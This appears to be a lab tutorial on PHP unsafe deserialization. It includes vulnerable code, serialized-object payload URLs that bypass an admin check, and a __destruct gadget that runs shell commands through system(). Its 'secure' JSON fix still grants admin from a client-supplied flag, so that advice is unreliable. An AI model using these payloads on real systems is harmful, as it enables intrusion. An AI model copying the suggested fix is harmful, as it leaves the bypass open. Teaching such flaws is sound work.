# UNSAFE DESERALIZATION Vulnerability Example
An Unsafe Deserialization is a vulnerability that uses PHP Objects to execute code in a PHP Website.

### Vulnerable Code

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize_original.php

```
<?php
/*Define the User Class */

class User {
    public $username;
    public $isAdmin = false;
}
/* Show a Text if the User has isAdmin in true*/

$data = unserialize($_GET['data']);
if ($data->isAdmin) {
    echo "¡Acceso de administrador concedido!";
}
?>
```
This script defines an object User with a param "isAdmin" if you put an object user with "isAdmin" as True you get a succesful login.

#### Get Exploit

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/eje_desi.php

```
<?php
class User {
    public $username = "hacker";
    public $isAdmin = true;
}
echo urlencode(serialize(new User()));
?>
```
This website generates a serialize object "User" that you can use to login into the website.

![alt text](./images/Unsafe%20User.png)

Put this object in the URL that you use to login into the website.


http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize_original.php?data=O%3A4%3A"User"%3A2%3A%7Bs%3A8%3A"username"%3Bs%3A6%3A"hacker"%3Bs%3A7%3A"isAdmin"%3Bb%3A1%3B%7D


![alt text](./images/Login%20with%20object.png)

To execute code in the server you can Inject an Exploit class, this class executes the command in the cmd param in the server where the object is destroyed.

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize.php

```
/*Define the Exploit Class */
class Exploit {
    public $cmd;
    
    /* Execute the command in the cmd param when the object is destoyed */
    public function __destruct() {
        system($this-> cmd);
    }
}
?>
```

This website generate a exploit that execute the command `pwd`

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/exploit.php

![alt text](./images/Create%20Exploit%20Object.png)

#### Execute Exploit
If you put this string in this object in this website you get the result of the `pwd` command

```
http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize.php?data=O%3A7%3A"Exploit"%3A1%3A%7Bs%3A3%3A"cmd"%3Bs%3A3%3A"pwd"%3B%7D/
```

### Secure Code

You can secure this code if remplace the object login with a JSON and login with the JSON.

```
<?php
/*Define the User Class */
class User {
    public $username;
    public $isAdmin = false;
}
/* Get the data content or create a empty object if data not exists */
$json = $_GET['data'] ?? "{}";

/*Decode the JSON*/
$data = json_decode($json, true);

/* If the JSON decoded isn't a array finish the execution*/
if (!is_array($data)) {
    die("Formato de datos no valido");
}

/* If in the JSON Array Exists the isAdmin param and is true shows a text for the Admin session */
if (isset ($data ["isAdmin"]) && $data["isAdmin"] === true) {
    echo "Acceso de administrador concedido";
} else {
    echo "Acceso normal";
}
?>
```

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize_json.php?data={"username":"hacker","isAdmin":true}

This Website returns a login as Admin.

![alt text](./images/JSON%20Login.png)

If you want to create a more secure code you can verify the JSON, if you insert a not valid param in the json the PHP execution stops.

http://localhost/Examples-of-Web-Vulnerabilities/UNSAFE_DESERIALIZATION/deserialize_full.php?data={"isAdmin":true,%20"bypass":"0"}

![alt text](./images/Invalid%20JSON%20Example.png)